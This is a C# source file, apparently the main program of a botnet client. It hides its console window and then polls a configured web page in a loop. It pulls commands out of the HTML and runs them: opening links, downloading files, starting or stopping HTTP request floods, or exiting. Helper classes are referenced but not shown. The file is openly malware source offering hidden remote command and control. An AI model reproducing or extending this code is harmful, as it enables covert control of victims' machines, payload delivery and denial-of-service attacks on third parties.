using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;

namespace Botnet
{
    class Program
    {

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();


        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        const int SW_HIDE = 0;


        static string last_cmd = string.Empty;
        static void Main(string[] args)
        {
            var handle = GetConsoleWindow();


            // Hide
           ShowWindow(handle, SW_HIDE);

            while (true)
            {
                string html = web.GetHTML(configs.server);
                Match regx = Regex.Match(html, "<p>(.*)</p></article>");
                
                string content = regx.Groups[1].Value;
                if (last_cmd == content)
                {
                    Thread.Sleep(configs.delay);
                    continue;
                }
                last_cmd = content;
               
                cmd command = new cmd(content);
                Execute(command);
                Thread.Sleep(configs.delay);


            }

        }

        static void Execute(cmd CMD)
        {
            switch (CMD.ComType)
            {
                case "open_link":
                    Functions.OpenLink(CMD.ComContent);
                    Console.WriteLine(CMD.ComContent);
                    break;
                case "download":
                    Functions.Download(CMD.ComContent);
                    break;
                case "stop":
                    Functions.run(false);

                    break;
                case "http":
                    Functions.run(true);

                    Functions.Httprequest(CMD.ComContent);
                    break;
               
                case "exit":
                    Environment.Exit(0);
                    break;
            }

        }
    }
}
